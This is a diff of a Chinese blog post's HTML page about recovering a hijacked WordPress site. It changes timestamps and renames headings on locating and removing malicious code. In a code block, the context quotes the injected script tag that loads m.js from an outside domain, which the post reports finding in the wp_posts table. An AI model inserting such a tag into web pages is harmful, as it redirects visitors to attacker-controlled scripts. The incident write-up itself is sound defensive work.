@@ -41,7 +41,7 @@
 <meta property="og:image" content="http://img.owq.world/2022/06/1116-1922b9.png">
 <meta property="og:image" content="http://img.owq.world/2022/06/1125-160779.png">
 <meta property="article:published_time" content="2022-06-25T16:11:15.000Z">
-<meta property="article:modified_time" content="2022-06-25T08:33:56.383Z">
+<meta property="article:modified_time" content="2022-06-25T08:37:17.723Z">
 <meta property="article:author" content="OWQ">
 <meta property="article:tag" content="WordPress">
 <meta name="twitter:card" content="summary">
@@ -218,7 +218,7 @@
             <span class="post-meta-item-text">Created</span>
             
 
-            <time title="创建时间：2022-06-25 16:11:15 / 修改时间：08:34:24" itemprop="dateCreated datePublished" datetime="2022-06-25T16:11:15Z">2022-06-25</time>
+            <time title="创建时间：2022-06-25 16:11:15 / 修改时间：08:37:22" itemprop="dateCreated datePublished" datetime="2022-06-25T16:11:15Z">2022-06-25</time>
 
             <span style="margin: 0 0.5em;"> | </span>
 
@@ -226,7 +226,7 @@
                 <i class="far fa-calendar-check"></i>
             </span>
             <span class="post-meta-item-text">Updated</span>
-            <time title="修改时间：2022-06-25 08:34:24" itemprop="dateModified" datetime="2022-06-25T16:34:24+08:00">2022-06-25</time>
+            <time title="修改时间：2022-06-25 08:37:22" itemprop="dateModified" datetime="2022-06-25T16:37:22+08:00">2022-06-25</time>
             
           </span>
 
@@ -350,7 +350,7 @@
 <li><p>答案确认了--网站被黑, 那接下来正式解决问题.</p>
 </li>
 </ol>
-<h2 id="定位重定向代码"><a href="#定位重定向代码" class="headerlink" title="定位重定向代码"></a>定位重定向代码</h2><blockquote>
+<h2 id="定位恶意代码"><a href="#定位恶意代码" class="headerlink" title="定位恶意代码"></a>定位恶意代码</h2><blockquote>
 <p>捡起老本行(逆向), 分析一波网络请求先, 很轻松的就找到恶意代码.</p>
 </blockquote>
 <p>首先, 搜索一开始跳转的域名, 找到该请求, 并没有得到有价值的信息, 我们需要找到发起该请求的地方.</p>
@@ -377,7 +377,7 @@
 <h2 id="处理恶意插件"><a href="#处理恶意插件" class="headerlink" title="处理恶意插件"></a>处理恶意插件</h2><blockquote>
 <p>这里通过关键字搜索恶意插件名无果后, 直接把网站上看起来的&quot;奇奇怪怪&quot;插件都给清了, 后面也没有复发, 简单又省事~</p>
 </blockquote>
-<h2 id="清除数据库恶意代码"><a href="#清除数据库恶意代码" class="headerlink" title="清除数据库恶意代码"></a>清除数据库恶意代码</h2><p>顺藤摸瓜, 找到DB.<code>wp_posts</code>里的恶意代码, 这里使用<code>phpMyAdmin</code>去连接(通过WP插件).</p>
+<h2 id="清除恶意代码"><a href="#清除恶意代码" class="headerlink" title="清除恶意代码"></a>清除恶意代码</h2><p>顺藤摸瓜, 找到DB.<code>wp_posts</code>里的恶意代码, 这里使用<code>phpMyAdmin</code>去连接(通过WP插件).</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=’text/javascript’ src=’<span class="attr">https</span>:<span class="comment">//trend.linetoadsactive.com/m.js?n=ns1′&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="http://img.owq.world/2022/06/1125-160779.png"></p>
@@ -504,7 +504,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E6%B5%81%E7%A8%8B"><span class="nav-text">劫持流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0"><span class="nav-text">定位问题原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8D%E9%87%8D%E5%AE%9A%E5%90%91%E4%BB%A3%E7%A0%81"><span class="nav-text">定位重定向代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%84%E7%90%86%E6%81%B6%E6%84%8F%E6%8F%92%E4%BB%B6"><span class="nav-text">处理恶意插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="nav-text">清除数据库恶意代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E6%BB%9A%E6%95%B0%E6%8D%AE"><span class="nav-text">回滚数据</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E6%B5%81%E7%A8%8B"><span class="nav-text">劫持流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0"><span class="nav-text">定位问题原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8D%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="nav-text">定位恶意代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%84%E7%90%86%E6%81%B6%E6%84%8F%E6%8F%92%E4%BB%B6"><span class="nav-text">处理恶意插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="nav-text">清除恶意代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E6%BB%9A%E6%95%B0%E6%8D%AE"><span class="nav-text">回滚数据</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
